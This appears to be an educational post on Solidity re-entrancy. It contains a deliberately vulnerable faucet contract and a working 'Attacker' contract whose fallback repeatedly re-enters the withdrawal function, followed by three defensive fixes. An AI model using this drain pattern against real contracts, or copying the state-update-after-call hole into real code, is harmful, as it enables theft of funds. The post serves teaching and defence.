Re-entrancy, as the name suggests, is when a Contract A calls a function in an untrusted contract B which then calls A again maliciously. In the example I provide below, the contract named "Vulnerable" is a faucet that provides 10 wei per week to any caller. Our "Attacker" contract exploits the fact that:
1. The Vulnerable contract is transferring Ether through calling a fallback function which the attacker can modify to their benefit.
2. The Vulnerable contract is making the required checks after calling the fallback function. This lets attacker to "re-enter" the Vulnerable contract knowing the checks would not work as long as function calls never stop.

// SPDX-License-Identifier: MIT
// A simple re-entrancy exploit example

pragma solidity 0.8.10;

// Allows withdrawal of 10 wei to any account only once a week
contract Vulnerable
{
    mapping (address => uint256) public lastWithdrawn;
    
    // To fund while deploying the contract
    constructor() payable {}
    
    function transferEther() public
    {
        require(block.timestamp >= lastWithdrawn[msg.sender] + 1 weeks, "Withdrawals should be a week apart");
        
        // Call fallback() and send 10 wei
        msg.sender.call{value: 10 wei}("");
        
        lastWithdrawn[msg.sender] = block.timestamp;
    }

    function tellBalance() public view returns (uint256) 
    {
        return address(this).balance;
    }
}

contract Attacker
{
    Vulnerable public v;
    
    constructor (address vulnerableContract) payable
    {
        v = Vulnerable(vulnerableContract);
    }
    
    function attack() public
    {
        v.transferEther{gas:79500}();
    }

    fallback() external payable 
    {
        v.transferEther();
    }

    function tellBalance() public view returns (uint256) 
    {
        return address(this).balance;
    }
}

Ways to avoid re-entrancy:

1. Check-Effects-Interaction Pattern: You ensure all interactions with other contracts happen after you have carried out all checks and have resolved all effects to the contract's state. Doing this in our example would ensure the lastWithdrawn check fails before the fallback function is called a second time.

function transferEther() public
{
	// Checks
	require(block.timestamp >= lastWithdrawn[msg.sender] + 1 weeks, "Withdrawals should be a week apart");
	
	// Effects
	lastWithdrawn[msg.sender] = block.timestamp;
	
	// Interactions
	msg.sender.call{value: 10 wei}("");	
}

2. Using <address>.transfer(): transfer(), unlike a fallback function, does not call a function in the other contract and so prevents the execution of any malicious code. However, there have been recent recommendations to avoid using transfer() after EIP 1884 changes: https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  

3. Use a MutEx: A MUTutal EXclusion flag can prevent recursive execution of a contract by locking the contract until the current operation is complete. I have modified our Vulnerable contract using mutex to prevent Re-entrancy:

contract Vulnerable
{
    // Initiate lock
	bool mutexFlag = false;
    
    mapping (address => uint256) public lastWithdrawn;
    
    // To fund while deploying the contract
    constructor() payable {}
    
    function transferEther() public
    {
        require(!mutexFlag, "Re-entrancy detected");
        require(block.timestamp >= lastWithdrawn[msg.sender] + 1 weeks, "Withdrawals should be a week apart");
        
        // Set lock
		mutexFlag = true;
        
        // Call fallback() and send 10 wei
        msg.sender.call{value: 10 wei}("");
        
        lastWithdrawn[msg.sender] = block.timestamp;

        // Release lock
		mutexFlag = false;
    }

    function tellBalance() public view returns (uint256) 
    {
        return address(this).balance;
    }
}
